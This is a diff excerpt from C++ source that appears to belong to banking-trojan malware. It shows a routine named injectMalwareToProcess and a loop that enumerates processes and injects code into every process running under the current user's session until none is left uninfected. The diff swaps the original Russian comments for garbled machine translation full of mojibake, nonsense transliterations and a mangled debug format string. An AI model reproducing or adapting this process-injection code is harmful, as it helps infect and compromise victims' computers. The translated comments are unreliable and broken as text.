@@ -16,17 +16,15 @@
 */
 extern const char baseConfigSource[sizeof(BASECONFIG)] = {'B', 'A', 'S', 'E', 'C', 'O', 'N', 'F', 'I', 'G'};
 
-/*
-  Инжектирование кода в конкретный процесс.
+/*В В Inject code in a particular process.
 
-  IN pid           - ID процесса.
-  IN processMutex  - мютекс процесса.
-  IN proccessFlags - данные для нового coreData.proccessFlags, текщие данные наследуются по маске
-                     Core::CDPT_INHERITABLE_MASK.
+В В IN pid - ID of the process.
+В В IN processMutex - myuteks process.
+В В IN proccessFlags - data for the new coreData.proccessFlags, tekschie data inherited by the mask
+В В В В В В В В В В В В В В В В В В В В В Core:: CDPT_INHERITABLE_MASK.
 
-  Return           - true - в случаи успеха,
-                     false - в случаи ошибки.
-*/
+В В Return - true - if successful,
+В В В В В В В В В В В В В В В В В В В В В false - if an error occurs.*/
 static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
 {
   bool ok = false;
@@ -95,7 +93,7 @@ bool CoreInject::_injectToAll(void)
 
   WDEBUG0(WDDT_INFO, "Listing processes...");  
 
-  //Ишим процессы до тех пор, пока не остнется не зараженных.
+  //Ishim process until until ostnetsya not infected.
   LPDWORD injectedPids    = NULL;
   DWORD injectedPidsCount = 0;
   DWORD newProcesses;
@@ -118,21 +116,21 @@ bool CoreInject::_injectToAll(void)
           DWORD sessionId;
           DWORD sidLength;
 
-          //Проверям сушетвует ли ID уже в списке.
+          //Checking sushetvuet whether ID is already in the list.
           for(DWORD i = 0; i < injectedPidsCount; i++)if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT;
 
           HANDLE mutexOfProcess = Core::createMutexOfProcess(pe.th32ProcessID);
           if(mutexOfProcess == NULL)goto SKIP_INJECT;
 
-          //Получаем SID процесса и сравниваем его с SID текшего процесса.
+          //Obtain the SID of the process and compare it with the SID streamed process.
           if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)
           {
-            //WDEBUG2(WDDT_INFO, "sessionId=\"%u\", coreData.currentUser.id=\"%u\"", sessionId, coreData.currentUser.id);
+            //WDEBUG2 (WDDT_INFO, "sessionId = \"% u \ ", coreData.currentUser.id = \"% u \ "", sessionId, coreData.currentUser.id);
             if(sessionId == coreData.currentUser.sessionId &&
                (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
                Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)
             {
-              //SID'ы равны.
+              //SID'y equal.
               if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
               {
                 injectedPids[injectedPidsCount++] = pe.th32ProcessID;
